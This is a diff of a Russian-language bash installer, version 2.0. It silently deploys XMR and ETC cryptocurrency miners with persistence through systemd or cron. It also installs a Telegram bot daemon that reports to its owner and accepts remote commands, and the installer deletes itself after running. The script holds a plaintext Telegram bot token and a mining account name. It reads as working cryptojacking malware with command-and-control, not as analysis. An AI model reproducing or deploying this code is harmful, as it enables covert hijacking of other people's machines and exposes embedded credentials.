@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #==============================================================================
-# ЯДРО - НЕ ТРОГАТЬ. ЭТОТ СКРИПT МЫСЛИТ И ПОДЧИНЯЕТСЯ.
+# ЯДРО - НЕ ТРОГАТЬ. ЭТОТ СКРИПT МЫСЛИТ И ПОДЧИНЯЕТСЯ. ВЕРСИЯ 2.0.
 #==============================================================================
 # Режим работы (определяется автоматически)
 ROOT_MODE=false
@@ -21,6 +21,7 @@ else
 fi
 
 #==============================================================================
+# КОНФИГУРАЦИЯ (ЕДИНСТВЕННОЕ, ЧТО ТЕБЕ МОЖЕТ ПОНАДОБИТЬСЯ ТРОГАТЬ)
 #==============================================================================
 KRIPTEX_USERNAME="krxYNV2DZQ"
 TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg" # Твой токен от @BotFather
@@ -42,6 +43,7 @@ WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"
 ETC_USERNAME="$WORKER_NAME"
 XMR_USERNAME="$WORKER_NAME"
 
+# Эта функция теперь используется ТОЛЬКО самим установщиком
 send_telegram_message() {
     local message="$1"
     if [ "$ROOT_MODE" = false ]; then return 0; fi
@@ -54,7 +56,7 @@ send_telegram_message() {
 install_dependencies() {
     if [ "$ROOT_MODE" = true ]; then
         echo "[INFO] Режим Бога: Устанавливаю системные зависимости (wget, curl, cron, python3)..."
-        apt-get install -y wget curl cron python3 >/dev/null || yum install -y wget curl cronie python3 >/dev/null
+        apt-get update -qq >/dev/null && apt-get install -y wget curl cron python3 >/dev/null || yum install -y wget curl cronie python3 >/dev/null
     else
         echo "[INFO] Режим Смертного: Проверка зависимостей..."
         ! command -v wget &> /dev/null && echo "[ERROR] wget не найден! Установи его." && exit 1
@@ -80,9 +82,10 @@ install_miners() {
 }
 
 create_scripts() {
-    echo "[INFO] Создаю скрипты запуска и утилиты управления в $BIN_DIR..."
+    echo "[INFO] Создаю МОЛЧАЛИВЫЕ и ЭФФЕКТИВНЫЕ утилиты управления в $BIN_DIR..."
     mkdir -p "$BIN_DIR"
 
+    # Скрипты запуска майнеров
     cat > "$INSTALL_DIR/etc/start.sh" << EOF
 #!/bin/bash
 cd "$INSTALL_DIR/etc"
@@ -97,30 +100,27 @@ cd "$INSTALL_DIR/xmr"
 EOF
     chmod +x "$INSTALL_DIR/xmr/start.sh"
 
+    # Утилиты управления. Теперь они не отправляют сообщения.
     cat > "$BIN_DIR/start-mining" << EOF
 #!/bin/bash
-echo "[INFO] Запускаю майнеры..."
 nohup $INSTALL_DIR/etc/start.sh > $LOG_DIR/etc-miner.log 2>&1 &
 nohup $INSTALL_DIR/xmr/start.sh > $LOG_DIR/xmr-miner.log 2>&1 &
-sleep 1
-echo "[OK] Майнеры запущены в фоновом режиме. Логи в $LOG_DIR"
-send_telegram_message "[START] Майнеры на $(hostname) запущены."
+echo "Майнеры запущены в фоновом режиме."
 EOF
     chmod +x "$BIN_DIR/start-mining"
 
     cat > "$BIN_DIR/stop-mining" << EOF
 #!/bin/bash
-echo "[INFO] Останавливаю майнеры..."
 pkill -f "$INSTALL_DIR/etc/lolMiner"
 pkill -f "$INSTALL_DIR/xmr/xmrig"
 sleep 1
 pkill -9 -f "$INSTALL_DIR/etc/lolMiner"
 pkill -9 -f "$INSTALL_DIR/xmr/xmrig"
-echo "[OK] Майнеры остановлены."
-send_telegram_message "[STOP] Майнеры на $(hostname) остановлены."
+echo "Майнеры остановлены."
 EOF
     chmod +x "$BIN_DIR/stop-mining"
 
+    # Скрипт статуса остается без изменений
     cat > "$BIN_DIR/mining-status" << EOF
 #!/bin/bash
 echo "=== СТАТУС МАЙНЕРОВ ==="
@@ -139,6 +139,7 @@ EOF
 }
 
 setup_autostart() {
+    # Эта функция без изменений
     if [ "$ROOT_MODE" = true ]; then
         echo "[INFO] Режим Бога: Настраиваю автозапуск майнеров через systemd..."
         cat > /etc/systemd/system/etc-miner.service << EOF
@@ -179,12 +180,10 @@ EOF
     fi
 }
 
-#--- НОВЫЙ БЛОК: УПРАВЛЕНИЕ ЧЕРЕЗ TELEGRAM ---
 
 create_bot_script() {
-    echo "[INFO] Создаю демона для управления через Telegram..."
-    # 'Here document' для создания python-скрипта.
-    # Обрати внимание, как я экранирую \` и \$ чтобы они попали в скрипт как текст, а не выполнились баш-оболочкой.
+    echo "[INFO] Создаю УЛУЧШЕННОГО демона для управления через Telegram..."
+    # Python-скрипт теперь сам отправляет все уведомления о статусе команд
     cat > "$INSTALL_DIR/bot_control.py" << EOF
 import os
 import subprocess
@@ -226,7 +225,7 @@ def run_command(command):
             timeout=30,
             check=True
         )
-        return result.stdout.strip()
+        return result.stdout.strip() if result.stdout else "Команда выполнена без вывода."
     except subprocess.CalledProcessError as e:
         return f"Команда завершилась с ошибкой:\n{e.stderr.strip()}"
     except Exception as e:
@@ -236,7 +235,7 @@ def main_loop():
     """Главный цикл демона: опрос API и обработка команд."""
     update_offset = 0
     print("Демон управления запущен. Ожидание команд...")
-    send_message(ALLOWED_CHAT_ID, f"✅ *Демон управления запущен на хосте* \`{HOSTNAME}\`")
+    send_message(ALLOWED_CHAT_ID, f"✅ *Демон управления v2.0 запущен на хосте* \`{HOSTNAME}\`")
 
     while True:
         try:
@@ -260,20 +259,19 @@ def main_loop():
 
                 print(f"Получена команда '{command_text}' от хозяина.")
                 
-                response_text = ""
                 if command_text == '/status':
-                    response_text = f"*Текущий статус на \`{HOSTNAME}\`:*\n\`\`\`\n{run_command('mining-status')}\n\`\`\`"
+                    status_output = run_command('mining-status')
+                    send_message(chat_id, f"*Текущий статус на \`{HOSTNAME}\`:*\n\`\`\`\n{status_output}\n\`\`\`")
                 elif command_text == '/restart':
-                    send_message(chat_id, "⏳ Принято. Перезапускаю майнеры...")
+                    send_message(chat_id, f"⏳ *Принято. Перезапускаю майнеры на \`{HOSTNAME}\`...*")
                     run_command('stop-mining')
                     time.sleep(2)
-                    start_output = run_command('start-mining')
-                    response_text = f"✅ *Перезапуск на \`{HOSTNAME}\` завершен.*\n\`\`\`\n{start_output}\n\`\`\`"
+                    run_command('start-mining')
+                    time.sleep(5) # Даем майнерам время запуститься и написать в лог
+                    new_status = run_command('mining-status')
+                    send_message(chat_id, f"✅ *Перезапуск на \`{HOSTNAME}\` завершен.*\n\n*Новый статус:*\n\`\`\`\n{new_status}\n\`\`\`")
                 elif command_text == '/help':
-                    response_text = f"Доступные команды для \`{HOSTNAME}\`:\n*/status* - проверить статус\n*/restart* - перезапустить"
-                
-                if response_text:
-                    send_message(chat_id, response_text)
+                    send_message(chat_id, f"Доступные команды для \`{HOSTNAME}\`:\n*/status* - проверить статус\n*/restart* - перезапустить")
 
         except Exception as e:
             print(f"++ОШИБКА++ в главном цикле: {e}")
@@ -289,6 +287,7 @@ EOF
 }
 
 setup_bot_service() {
+    # Эта функция без изменений
     if [ ! -f "$INSTALL_DIR/bot_control.py" ]; then
         echo "[WARN] Скрипт демона не найден, пропускаю настройку автозапуска."
         return
@@ -319,15 +318,12 @@ EOF
     fi
 }
 
-#==============================================================================
-# ГЛАВНЫЙ ПОТОК ВЫПОЛНЕНИЯ
-#==============================================================================
 main() {
     echo "======================================================================="
     if [ "$ROOT_MODE" = true ]; then echo "  РЕЖИМ БОГА АКТИВИРОВАН (установка с правами root)"; else echo "  РЕЖИМ СМЕРТНОГО (локальная установка без root)"; fi
     echo "======================================================================="
     
-    send_telegram_message "[INSTALL] Начало установки на $(hostname) (режим: $ROOT_MODE)"
+    send_telegram_message "[INSTALL] Начало установки/обновления на $(hostname) (v2.0)"
 
     install_dependencies
     install_miners
@@ -337,37 +333,17 @@ main() {
     setup_bot_service
 
     echo ""
-    echo "======================================================================="
-    echo "  [OK] НАСТРОЙКА ЗАВЕРШЕНА!"
-    echo "======================================================================="
-    echo ""
-
-    if [ "$ROOT_MODE" = false ]; then
-        if [[ ":$PATH:" != *":$HOME/.local/bin:"* ]]; then
-            echo "[WARN] Каталог $HOME/.local/bin не найден в твоем PATH."
-            echo "[INFO] Чтобы команды были доступны, добавь в свой .bashrc или .zshrc:"
-            echo '  export PATH="$HOME/.local/bin:$PATH"'
-            echo "[INFO] А затем выполни: source ~/.bashrc (или ~/.zshrc)"
-        fi
-    fi
-
-    echo "ЗАПУСКАЮ МАЙНЕРЫ В ПЕРВЫЙ РАЗ..."
+    echo "ЗАПУСКАЮ/ПЕРЕЗАПУСКАЮ МАЙНЕРЫ..."
     "$BIN_DIR/stop-mining" >/dev/null 2>&1
     sleep 2
     "$BIN_DIR/start-mining"
 
     echo ""
     echo "======================================================================="
-    echo "  КОМАНДЫ УПРАВЛЕНИЯ:"
-    echo "    start-mining     - запустить майнеры"
-    echo "    stop-mining      - остановить майнеры"
-    echo "    mining-status    - проверить статус"
-    echo ""
-    echo "  УПРАВЛЕНИЕ ЧЕРЕЗ TELEGRAM:"
-    echo "    Отправь боту /help для списка команд"
+    echo "  [OK] НАСТРОЙКА ЗАВЕРШЕНА! СИСТЕМА ОБНОВЛЕНА."
     echo "======================================================================="
     
-    send_telegram_message "[SUCCESS] Установка на $(hostname) завершена. Система под контролем."
+    send_telegram_message "[SUCCESS] Установка на $(hostname) завершена. Система под контролем (v2.0)."
     
     echo "[INFO] Самоуничтожение скрипта установщика..."
     rm -f -- "$0"
